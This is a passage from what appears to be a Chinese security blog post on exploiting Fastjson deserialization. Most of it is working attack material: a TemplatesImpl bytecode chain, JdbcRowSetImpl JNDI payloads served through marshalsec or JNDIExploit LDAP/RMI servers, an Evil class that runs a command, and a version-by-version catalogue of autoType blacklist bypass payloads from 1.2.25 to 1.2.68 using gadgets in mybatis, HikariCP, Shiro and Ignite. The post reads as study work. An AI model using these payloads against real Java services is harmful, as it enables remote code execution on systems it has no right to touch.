class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">fileSeparator</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;file.separator&quot;</span>);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">evilClassPath</span> <span class="operator">=</span> <span class="string">&quot;D:\\JavaProject\\Javastudy\\cc3\\src\\main\\java\\Evil.class&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">evilCode</span> <span class="operator">=</span> readClass(evilClassPath);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">text1</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +</span><br><span class="line">            <span class="string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;jmx0hxq&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span>;</span><br><span class="line">            System.out.println(text1);</span><br><span class="line"></span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">            <span class="comment">//Object obj = JSON.parse(text1, Feature.SupportNonPublicField);</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240326001036.png" alt="image.png"></p>
<h4 id="基于JdbcRowSetImpl的利用链"><a href="#基于JdbcRowSetImpl的利用链" class="headerlink" title="基于JdbcRowSetImpl的利用链"></a>基于JdbcRowSetImpl的利用链</h4><p>这个对jdk版本有限制:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">基于RMI利用的JDK版本 ≤ 6u141、7u131、8u121</span><br><span class="line">基于LDAP利用的JDK版本 ≤ 6u211、7u201、8u191。</span><br></pre></td></tr></table></figure></p>
<p>这里先装个jdk8u111: <a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p>
<h5 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI+LDAP"></a>JNDI+LDAP</h5><p>JdbcRowSetImpl 类里面有一个setAutoCommit()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240326002041.png" alt="image.png"><br>由于第一次初始化肯定conn为null,进入connect()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240326002103.png" alt="image.png"></p>
<p>这里有lookup,getDataSourceName()返回一个变量dataSource,而我们可以控制这个变量为恶意JNDI监听端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://localhost:1389/Evil&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
<p>JNDI工具:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 0.0.0.0</span><br></pre></td></tr></table></figure></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240326132359.png" alt="image.png"></p>
<p>或者我们可以使用marshalsec项目:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/mbechler/marshalsec.git</span><br><span class="line">cd marshalsec</span><br><span class="line">mvn clean package -DskipTests</span><br><span class="line">cd target</span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://0.0.0.0:8080/#Evil 1389</span><br></pre></td></tr></table></figure></p>
<p>我们需要在一个文件里准备好编译好的Evil.class文件,然后用python开启一个临时服务器<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m http.server 8080</span><br></pre></td></tr></table></figure></p>
<p>Evil.java<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>此时payload:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/Evil\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240326133918.png" alt="image.png"></p>
<h5 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h5><p>原理一样,换成RMI协议<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://0.0.0.0:8080/#Evil 1099</span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240326134051.png" alt="image.png"></p>
<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h3 id="1-2-25-1-2-41-绕过"><a href="#1-2-25-1-2-41-绕过" class="headerlink" title="1.2.25-1.2.41 绕过"></a>1.2.25-1.2.41 绕过</h3><ul>
<li>需要开启autoTypeSupport</li>
<li>在目标类前加L,后面加;<br>调试:<br><code>JSON.parse(payload);</code>下断点,一直走<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240326165331.png" alt="image.png"></li>
</ul>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240326165348.png" alt="image.png"></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240326165418.png" alt="image.png"></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240326165437.png" alt="image.png"></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240326165448.png" alt="image.png"><br>调用到checkAutoType方法,前面一堆操作没啥用,if判断:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240326165538.png" alt="image.png"><br>然后进入loadClass方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240326165621.png" alt="image.png"><br>这里可以看到对className做了处理,删除了L和;最后会被清空</p>
<p>EXP:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/Evil\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="1-2-25-1-2-42-绕过"><a href="#1-2-25-1-2-42-绕过" class="headerlink" title="1.2.25-1.2.42 绕过"></a>1.2.25-1.2.42 绕过</h3><ul>
<li>开启autoTypeSupport</li>
<li>双写L加分号绕过<br>这里链子都是一样的,我们直接看TypeUtil的loadClass()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240326170309.png" alt="image.png"><br>这里截取一次<code>[和;</code>之后就又调用loadClass()方法了,完全可以双写绕过,甚至写三个四个都可以<br>Exp:<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/Evil\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240326170907.png" alt="image.png"></li>
</ul>
<h3 id="1-2-25-1-2-43-绕过"><a href="#1-2-25-1-2-43-绕过" class="headerlink" title="1.2.25-1.2.43 绕过"></a>1.2.25-1.2.43 绕过</h3><p>官方对于1.2.42的修复是类中连续两个L就会抛出异常<br>但是之前的代码我们可以发现出了L还有<code>[</code><br>一开始想着改成:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[com.sun.rowset.JdbcRowSetImpl</span><br></pre></td></tr></table></figure><br>报错:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: exepct &#x27;[&#x27;, but ,, pos 42, json : &#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:1389/Evil&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure></p>
<p>第42个位置是第一个逗号,我在逗号前加一个<code>[</code>:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/Evil\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><br>报错:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">syntax error, expect &#123;, actual string, pos 43</span><br></pre></td></tr></table></figure><br>然后再在逗号前加个<code>&#123;</code></p>
<p>Exp:<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/Exploit&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><br>此时成功弹出计算器<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240326173311.png" alt=""></p>
<h3 id="1-2-25-1-2-45绕过方式"><a href="#1-2-25-1-2-45绕过方式" class="headerlink" title="1.2.25-1.2.45绕过方式"></a>1.2.25-1.2.45绕过方式</h3><ul>
<li>需要开启autoType</li>
<li>需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列&lt;3.5.0的版本</li>
</ul>
<p>poe.xml<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><br>Exp:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">PoC</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;ldap://127.0.0.1:1389/Exploit\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(PoC);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>不在黑名单,可以绕过checkAutoType函数,然后它还有个setProperties()方法,可以调用lookup函数,参数是可控的data_source变量<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240326215958.png" alt="image.png"></p>
<h3 id="1-2-25-1-2-47通杀"><a href="#1-2-25-1-2-47通杀" class="headerlink" title="1.2.25-1.2.47通杀"></a>1.2.25-1.2.47通杀</h3><p>条件:</p>
<ul>
<li>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；</li>
<li>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；<br>payload:<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:1389/badNameClass&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>Exp:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String str=<span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;a\&quot;:&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;b\&quot;:&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Evil\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;autoCommit\&quot;:true\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="1-2-25-1-2-59"><a href="#1-2-25-1-2-59" class="headerlink" title="1.2.25-1.2.59"></a>1.2.25-1.2.59</h3><ul>
<li>需要包<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.zaxxer<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>HikariCP<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>需要autoType</li>
</ul>
<p>payload:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125; 或 &#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;</span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240326223235.png" alt="image.png"></p>
<h3 id="1-2-25-1-2-60"><a href="#1-2-25-1-2-60" class="headerlink" title="1.2.25-1.2.60"></a>1.2.25-1.2.60</h3><p>payload:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.commons.configuration.JNDIConfiguration&quot;,&quot;prefix&quot;:&quot;ldap://localhost:1389/Evil&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;,&quot;xaDataSourceName&quot;:&quot;rmi://localhost:1389/Evil&quot;&#125;</span><br></pre></td></tr></table></figure><br>这两个找对应的包没复习成功不知道为啥</p>
<h3 id="1-2-25-1-2-61"><a href="#1-2-25-1-2-61" class="headerlink" title="1.2.25-1.2.61"></a>1.2.25-1.2.61</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;,&quot;jndiName&quot;:&quot;ldap://localhost:1389/Evil</span><br></pre></td></tr></table></figure>
<h3 id="1-2-62"><a href="#1-2-62" class="headerlink" title="1.2.62"></a>1.2.62</h3><p>需要开启AutoType；需要服务端存在xbean-reflect包；JNDI注入受JDK版本的影响。</p>
<p>几个payload:<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;AsText&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;parameters&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.util.Hashtable&quot;</span><span class="punctuation">,</span><span class="attr">&quot;java.naming.factory.initial&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;topic-factory&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="attr">&quot;namespace&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="1-2-66"><a href="#1-2-66" class="headerlink" title="1.2.66"></a>1.2.66</h3><p><a href="https://paper.seebug.org/1155/">Fastjson1.2.6 6 远程代码执行漏洞分析复现含 4 个 Gadget 利用 Poc 构造 (seebug.org)</a></p>
<p>黑名单绕过，都需要开启AutoType。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;jndiNames&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Realms&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;metricRegistry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;healthCheckRegistry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.util.Properties&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;UserTransaction&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span><span class="punctuation">,</span><span class="attr">&quot;jndiNames&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="1-2-67"><a href="#1-2-67" class="headerlink" title="1.2.67"></a>1.2.67</h3><p>黑名单绕过，需要开启AutoType。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;jndiNames&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;tm&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.tm&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;resourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;instance&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.instance&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="1-2-68"><a href="#1-2-68" class="headerlink" title="1.2.68"></a>1.2.68</h3><p>假设有个实现AutoCloseable接口类的恶意类<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jmx;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cmd</span> <span class="keyword">implements</span> <span class="title class_">AutoCloseable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">cmd</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span 